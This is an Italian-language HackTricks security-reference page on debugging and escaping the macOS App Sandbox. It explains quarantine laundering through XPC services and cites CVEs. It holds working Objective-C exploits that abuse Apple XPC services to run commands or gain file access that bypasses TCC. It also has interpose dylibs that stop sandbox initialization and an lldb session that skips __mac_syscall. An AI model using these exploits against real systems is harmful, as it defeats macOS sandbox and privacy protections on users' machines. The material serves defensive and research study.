# Debug e bypass del macOS Sandbox

{{#include ../../../../../banners/hacktricks-training.md}}

## Processo di caricamento del Sandbox

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Immagine tratta da <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Nell'immagine precedente è possibile osservare **come verrà caricato il Sandbox** quando viene eseguita un'applicazione con l'entitlement **`com.apple.security.app-sandbox`**.

Il compilatore collegherà `/usr/lib/libSystem.B.dylib` al binary.

Successivamente, **`libSystem.B`** chiamerà diverse altre funzioni finché **`xpc_pipe_routine`** non invierà gli entitlement dell'app a **`securityd`**. Securityd verifica se il processo deve essere messo in quarantena all'interno del Sandbox e, in tal caso, lo metterà in quarantena.\
Infine, il Sandbox verrà attivato con una chiamata a **`__sandbox_ms`**, che chiamerà **`__mac_syscall`**.<sup>[[1]](#references)[[3]](#references)</sup>

## Possibili bypass

### Bypass dell'attributo di quarantena

Ai **file creati da processi sandboxed** viene aggiunto l'**attributo di quarantena** per impedire le sandbox escape: se si crea una nuova applicazione e si prova ad avviarla, il flag di quarantena la blocca. Pertanto, **se è possibile creare un file o una cartella *senza* l'attributo di quarantena, è possibile effettuare una escape dall'App Sandbox** — basta creare un bundle `.app` e avviarlo con `open`, poiché il processo appena avviato viene eseguito sotto LaunchServices e non sotto il proprio Sandbox.

Il modo affidabile per ottenere una **creazione senza quarantena** consiste nel chiedere a **un altro processo di creare il file**. Come documentato in [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) da Mickey Jin, l'**App Sandbox** contrassegna i file creati con la quarantena, mentre i servizi XPC eseguiti sotto il Service Sandbox **non lo fanno**. Di conseguenza, diversi servizi XPC non autenticati potevano essere utilizzati come primitiva di "quarantine laundering":<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) e **CVE-2023-32414** (`ArchiveService`): estraggono un archivio passato da un'app sandboxed in una posizione scelta **senza propagare l'xattr di quarantena** al contenuto estratto.
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): il path traversal in `submitSignpostDataWithConfig:` consentiva di creare **directory arbitrarie senza quarantena**, sufficiente per creare l'intera struttura di un bundle `.app` al di fuori del container.
- **CVE-2024-27864** (`diskimagescontroller.xpc`): collega una DMG sottoposta a quarantena **senza mettere in quarantena il device risultante**, rendendo avviabili le app presenti sul volume montato.

> [!TIP]
> L'estrazione solitamente **rimuove il bit di permesso executable**. Il workaround utilizzato in CVE-2023-27944 consisteva nel collocare un **symlink** a un binary di sistema firmato esistente (ad esempio `/System/Library/CoreServices/Automator Application Stub`) come executable principale del bundle, mantenendolo avviabile senza richiedere `+x` su un file creato.

> [!CAUTION]
> Il motivo per cui funziona è che il controllo dipende dal **flag sull'elemento che viene avviato**: *"When an app or other executable code is run from the Finder or GUI, macOS checks its quarantine flag before loading it"*, e solo allora *"it's handed over to Gatekeeper for full 'first run' security checks"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Nessun flag sul bundle che viene avviato significa nessun controllo di Gatekeeper — che è esattamente la primitiva fornita dalle CVE precedenti.<sup>[[5]](#references)</sup>
>
> Si noti che, se un bundle `.app` è già stato autorizzato all'esecuzione (possiede un xattr di quarantena con il flag "authorized to run" attivo), sarebbe anche possibile abusarne... tuttavia, a quel punto non è possibile scrivere all'interno dei bundle **`.app`** a meno di disporre di alcuni permessi TCC privilegiati (che non saranno disponibili all'interno di un Sandbox).

### Abuso della funzionalità Open

Negli [**ultimi esempi di bypass del Word Sandbox**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) è possibile osservare come la funzionalità CLI **`open`** possa essere sfruttata per effettuare il bypass del Sandbox.


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Anche se un'applicazione è **destinata a essere sandboxed** (`com.apple.security.app-sandbox`), è possibile effettuare il bypass del Sandbox se viene **eseguita da un LaunchAgent** (`~/Library/LaunchAgents`), ad esempio.\
Come spiegato in [**questo post**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), se si vuole ottenere persistence con un'applicazione sandboxed, è possibile configurarla per essere eseguita automaticamente come LaunchAgent e magari iniettare codice malevolo tramite le variabili d'ambiente DyLib.<sup>[[6]](#references)</sup>

### Abuso delle posizioni di avvio automatico

Se un processo sandboxed può **scrivere** in una posizione in cui **in seguito un'applicazione unsandboxed eseguirà il binary**, sarà in grado di **effettuare l'escape semplicemente collocando** lì il binary. Un buon esempio di questo tipo di posizioni è `~/Library/LaunchAgents` o `/System/Library/LaunchDaemons`.

Per farlo potrebbero essere necessari persino **2 passaggi**: fare in modo che un processo con un **Sandbox più permissivo** (`file-read*`, `file-write*`) esegua il codice che scriverà effettivamente in una posizione in cui verrà **eseguito senza Sandbox**.

Consultare questa pagina sulle **posizioni di avvio automatico**:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Abuso di altri processi

Se da quel processo sandboxed si riesce a **compromettere altri processi** eseguiti in Sandbox meno restrittivi (o privi di Sandbox), sarà possibile effettuare l'escape verso i loro Sandbox:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Servizi Mach di sistema e utente disponibili

Il Sandbox consente inoltre di comunicare con determinati **servizi Mach** tramite XPC definiti nel profilo `application.sb`. Se si riesce ad **abusare** di uno di questi servizi, potrebbe essere possibile **effettuare l'escape dal Sandbox**.

Come indicato in [questo writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), le informazioni sui servizi Mach sono memorizzate in `/System/Library/xpc/launchd.plist`. È possibile trovare tutti i servizi Mach di sistema e utente cercando all'interno di quel file `<string>System</string>` e `<string>User</string>`.<sup>[[4]](#references)</sup>

Inoltre, è possibile verificare se un servizio Mach è disponibile per un'applicazione sandboxed chiamando `bootstrap_look_up`:
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### Servizi Mach PID disponibili

Questi servizi Mach sono stati inizialmente abusati per [evadere dalla sandbox in questo writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). A quel tempo, **tutti i servizi XPC richiesti** da un'applicazione e dal relativo framework erano visibili nel dominio PID dell'app (si tratta di servizi Mach con `ServiceType` impostato su `Application`).<sup>[[4]](#references)</sup>

Per **contattare un servizio XPC del dominio PID**, è sufficiente registrarlo all'interno dell'app con una riga come:
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
Inoltre, è possibile trovare tutti i Mach services di **Application** cercando all'interno di `System/Library/xpc/launchd.plist` la stringa `<string>Application</string>`.

Un altro modo per trovare servizi xpc validi consiste nel controllare quelli presenti in:
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
Diversi esempi di abuso di questa tecnica sono disponibili nel [**writeup originale**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/); tuttavia, di seguito sono riportati alcuni esempi riassuntivi.<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Questo servizio consente ogni connessione XPC restituendo sempre `YES`, mentre il metodo `runTask:arguments:withReply:` esegue un comando arbitrario con parametri arbitrari.

L'exploit era "semplice quanto":
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Questo servizio XPC consentiva l'accesso a ogni client restituendo sempre `YES`, e il metodo `createZipAtPath:hourThreshold:withReply:` accettava il percorso di una cartella e la comprimeva in un file ZIP.

Pertanto, era possibile generare una struttura di cartelle di una falsa app, comprimerla, quindi decomprimerla ed eseguirla per evadere dalla sandbox, poiché i nuovi file non avrebbero avuto l'attributo di quarantena.

L'exploit era:
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Questo XPC service consente di concedere accesso in lettura e scrittura a un URL arbitrario al client XPC tramite il metodo `extendAccessToURL:completion:`, che accettava qualsiasi connessione. Poiché l'XPC service dispone di FDA, è possibile abusare di questi permessi per bypassare completamente TCC.

L'exploit consisteva nel:
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### Compilazione statica e linking dinamico

[**Questa ricerca**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) ha scoperto 2 modi per bypassare la Sandbox. Poiché la sandbox viene applicata da userland quando viene caricata la libreria **libSystem**. Se un binary potesse evitare di caricarla, non verrebbe mai sottoposto alla sandbox:<sup>[[2]](#references)</sup>

- Se il binary fosse **completamente compilato staticamente**, potrebbe evitare di caricare quella libreria.
- Se il **binary non avesse bisogno di caricare alcuna libreria** (perché anche il linker si trova in libSystem), non avrebbe bisogno di caricare libSystem.

### Shellcodes

Nota che **anche gli shellcode** su ARM64 devono essere collegati a `libSystem.dylib`:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Restrizioni non ereditate

Come spiegato nel **[bonus di questo writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, una restrizione della sandbox come:<sup>[[4]](#references)</sup>
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
può essere aggirato da un nuovo processo che esegue, ad esempio:
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
Tuttavia, naturalmente, questo nuovo processo non erediterà gli entitlement o i privilegi dal processo padre.

### Entitlement

Nota che, anche se alcune **azioni** potrebbero essere **consentite dal sandbox** se un'applicazione dispone di uno specifico **entitlement**, come in:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Bypass di Interposting

Per ulteriori informazioni su **Interposting**, consulta:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer` per impedire il sandbox
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interporre `__mac_syscall` per impedire il Sandbox
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Debug e bypass Sandbox con lldb

Let's compile an application that should be sandboxed:

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

Quindi compila l'app:
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> L'app proverà a **leggere** il file **`~/Desktop/del.txt`**, cosa che la **Sandbox non consentirà**.\
> Crea un file in quella posizione, perché una volta eseguito il bypass della Sandbox, l'app potrà leggerlo:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Eseguiamo il debug dell'applicazione per vedere quando viene caricata la Sandbox:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Anche dopo aver bypassato la Sandbox, TCC** chiederà all'utente se desidera consentire al processo di leggere i file dalla scrivania

## References

- [1] [Jonathan Levin - The Apple Sandbox: Deeper into the Quagmire (slide HITB GSEC 2016)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Mac App Store Sandbox Escape](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - The Apple Sandbox: Deeper into the Quagmire (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): macOS TCC Bypass w/ Telegram using DyLib Injection (Part 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
{{#include ../../../../../banners/hacktricks-training.md}}
